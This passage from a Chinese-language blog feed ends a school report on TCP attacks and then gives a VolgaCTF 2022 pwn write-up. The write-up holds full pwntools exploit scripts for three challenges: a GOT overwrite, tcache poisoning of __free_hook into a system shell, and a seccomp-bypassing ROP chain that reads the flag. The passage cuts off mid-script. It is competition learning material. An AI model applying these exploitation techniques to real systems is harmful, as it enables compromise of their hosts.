cookie可以很好的解决。</p><p>对于session劫持，采用Tls加密通信也可解决。</p><p>除此以外，随机化端口号，随机化序列号也可以解决一部分的问题。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次实验，了解了TCP协议具体内容，以及相关安全机制漏洞。分别使用Dos，劫持session，伪造发送RST包三种攻击方式完成了本次实验。并学习了相关安全保护机制。</p>]]></content>
      
      
      <categories>
          
          <category> school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> software-security </tag>
            
            <tag> tcp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volgaCTF2022_pwn</title>
      <link href="/2022/05/18/volgaCTF2022-pwn/"/>
      <url>/2022/05/18/volgaCTF2022-pwn/</url>
      
        <content type="html"><![CDATA[<p>来自俄罗斯的volgactf，这次也是忙里偷闲，后面一段时间可能因为期末都要没时间做了。<br>这次出了3道，还是挺爽的</p><span id="more"></span><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Power"><a href="#Power" class="headerlink" title="Power"></a>Power</h2><p>glibc2.31，但是头疼的是用了debian的libc<br><code>VolgaCTF&#123;what_@_c00l_pr1mitive&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./power&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;power.q.2022.volgactf.ru&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x40132E&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Heap base is &#x27;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x401403&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Where:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(heap_base+<span class="number">0xa8</span>)[<span class="number">2</span>:])</span><br><span class="line">io.recvuntil(<span class="string">&#x27;What:&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;got: &quot;</span> + <span class="built_in">hex</span>(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">io.sendline(<span class="built_in">hex</span>(elf.got[<span class="string">&#x27;exit&#x27;</span>])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(p64(elf.symbols[<span class="string">&#x27;win&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="habyheap"><a href="#habyheap" class="headerlink" title="habyheap"></a>habyheap</h2><p>2.33的 还没有移除freehook，有一个8byte的overflow，直接改size即可拿到libc，然后打free_hook即可。<br><code>VolgaCTF&#123;d0_y0u_f33l_7h3_s74r7_0f_7h3_n3w_3r4&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./habybeap&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;habybeap.q.2022.volgactf.ru&#x27;</span>, <span class="number">21337</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,choice,con</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;smol &gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;data&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.send(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;data&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;set debug-file-directory /home/nicholas/glibc-all-in-one/libs/libc6_2.33-0ubuntu5_amd64/.build-id\n&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;brva 0x126f\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">1</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">tcache_key = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;tcache key: &quot;</span> + <span class="built_in">hex</span>(tcache_key))</span><br><span class="line">heap_base = tcache_key &lt;&lt; <span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x441</span>)) <span class="comment"># change 1&#x27;s size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># into uns</span></span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xff</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_info  = libc_info - <span class="number">0xff</span></span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x1e0c00</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">tcache_key2 = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;tcache key2: &quot;</span> + <span class="built_in">hex</span>(tcache_key2))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">cur_heap = heap_base+<span class="number">0x0004c0</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">edit(<span class="number">5</span>,p64((libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base)^tcache_key2)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">add(<span class="number">10</span>,<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">1</span>,p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base)) <span class="comment"># write </span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mafia"><a href="#mafia" class="headerlink" title="mafia"></a>mafia</h2><p>这题很巧妙，开seccomp把read的fd限制死了0.给了close(),mmap(),read(),open(),write()这些函数调用。存在一个栈溢出，可以控制栈上指针导致任意地址读写。</p><p>目前能做到泄露所有地址，任意地址读写，但是rop的时候就是这里遇到了问题。<br>同时mmap也不行，因为他的r10寄存器我没法控制，libc和binary所有的gadget都试过了没有一个可以控制r10的。<br>贴一个脚本吧<br>后来想到的方法，<strong>先把输出流关了，就能写打开文件的时候分配到fd为0了</strong>。这样确实可以做出来</p><p><strong>目前本地出了，远程不知道为啥出不了</strong>，不管了反正我本地做出来了哈哈哈哈太开心了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename=<span class="string">&quot;./mafia&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc_name=<span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">io = remote(<span class="string">&#x27;mafia.q.2022.volgactf.ru&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,con</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;string:&#x27;</span>)</span><br><span class="line">    io.send(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,con</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;string:&#x27;</span>)</span><br><span class="line">    io.send(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_str</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x169A&quot;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0</span>,payload)</span><br><span class="line">print_str(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">code_info = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;code_info: &quot;</span> + <span class="built_in">hex</span>(code_info))</span><br><span class="line">code_base = code_info - <span class="number">0x00160b</span></span><br><span class="line">success(<span class="string">&quot;code_base: &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x176E&quot;) #puts</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line"><span class="comment"># add(1,2,&#x27;./flag.txt\x00&#x27;)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># print_str(1)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x171B&quot;) # edit</span></span><br><span class="line">puts_got = code_base+elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;puts_got: &quot;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(code_info)+p64(<span class="number">0xfffffffe00000340</span>)+p64(<span class="number">0x0000000300000001</span>)+p64(<span class="number">0xfffffffefffffffe</span>)+p64(<span class="number">0x00000000fffffffe</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(code_base+elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">print_str(<span class="number">0</span>)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">standard = p64(<span class="number">0</span>)+p64(code_info)+p64(<span class="number">0xfffffffe00000340</span>)+p64(<span class="number">0x0000000300000001</span>)+p64(<span class="number">0xfffffffefffffffe</span>)+p64(<span class="number">0x00000000fffffffe</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>])</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(code_info)+standard)</span><br><span class="line">print_str(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">stack_info = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;stack_info: &quot;</span> + <span class="built_in">hex</span>(stack_info))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">ret_addr = stack_info - <span class="number">256</span></span><br><span class="line">flag_str = stack_info - <span class="number">534</span></span><br><span class="line">success(<span class="string">&quot;flag_str:&quot;</span> + <span class="built_in">hex</span>(flag_str))</span><br><span class="line">flag_place = libc_base-<span class="number">0x2000</span></span><br><span class="line">success(<span class="string">&quot;flag_place: &quot;</span> + <span class="built_in">hex</span>(flag_place))</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)+p64(code_info)+standard</span><br><span class="line">payload2 +=p64(ret_addr) <span class="comment"># chunk1 </span></span><br><span class="line">edit(<span class="number">1</span>,payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # now write ROP in ret value</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000026796</span>+libc_base</span><br><span class="line">pop_rsi_r15 = <span class="number">0x000000000002890f</span>+libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000000cb1cd</span>+libc_base</span><br><span class="line">syscall = <span class="number">0x000000000002552b</span>+libc_base</span><br><span class="line">or_syscall = <span class="number">0x00000000000f8097</span>+libc_base</span><br><span class="line">mov_eax_ecx_syscall = libc_base+<span class="number">0x3bca5</span></span><br><span class="line">pop_rdx_rcx_rbx = <span class="number">0x00000000000e4e19</span>+libc_base</span><br><span class="line">pop_rax = <span class="number">0x000000000003ee88</span>+libc_base</span><br><span class="line">pop_r8 = <span class="number">0x000000000012a956</span>+libc_base</span><br><span class="line">pop_r10 = <span class="number">0x000000000007f6e1</span>+libc_base</span><br><span class="line">mov_r10 = libc_base + <span class="number">0x000000000006b30e</span><span class="comment"># add rax, rsi ; mov r10d, 1 ; jmp rax</span></span><br><span class="line">rop_chain = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># close</span></span><br><span class="line">rop_chain +=p64(pop_rdi)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line">rop_chain+=p64(pop_rax)</span><br><span class="line">rop_chain+=p64(<span class="number">0x3</span>)</span><br><span class="line">rop_chain+=p64(or_syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">rop_chain +=p64(pop_rdi) <span class="comment">#pop rdi</span></span><br><span class="line">rop_chain+=p64(flag_str)</span><br><span class="line"><span class="comment"># rop_chain+=p64(libc_base+libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line">rop_chain+=p64(pop_rsi_r15)</span><br><span class="line">rop_chain +=p64(<span class="number">2</span>)</span><br><span class="line">rop_chain +=p64(pop_rdx_ret)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rop_chain+=p64(pop_rax)</span><br><span class="line">rop_chain+=p64(<span class="number">2</span>)</span><br><span class="line">rop_chain +=p64(or_syscall)</span><br><span class="line"><span class="comment"># read</span></span><br><span class="line"><span class="comment"># rop_chain+=p64(pop_rax)</span></span><br><span class="line"><span class="comment"># rop_chain+=p64()</span></span><br><span class="line"><span class="comment"># rop_chain+=p64(mov_r10)</span></span><br><span class="line">rop_chain +=p64(pop_rdi)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line">rop_chain+=p64(pop_rsi_r15)</span><br><span class="line">rop_chain+=p64(flag_place)</span><br><span class="line">rop_chain +=p64(pop_rdx_ret)</span><br><span class="line">rop_chain+=p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain+=p64(pop_rax)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># rop_chain+=p64(pop_r10)</span></span><br><span class="line"><span class="comment"># rop_chain+=p64(0x1)</span></span><br><span class="line">rop_chain +=p64(or_syscall)</span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">rop_chain +=p64(pop_rdi)</span><br><span class="line">rop_chain+=p64(<span class="number">1</span>)</span><br><span class="line">rop_chain+=p64(pop_rsi_r15)</span><br><span class="line">rop_chain+=p64(flag_place)</span><br><span class="line">rop_chain+=p64(pop_rdx_ret)</span><br><span class="line">rop_chain+=p64(<span class="number">0x100</span>)</span><br><span 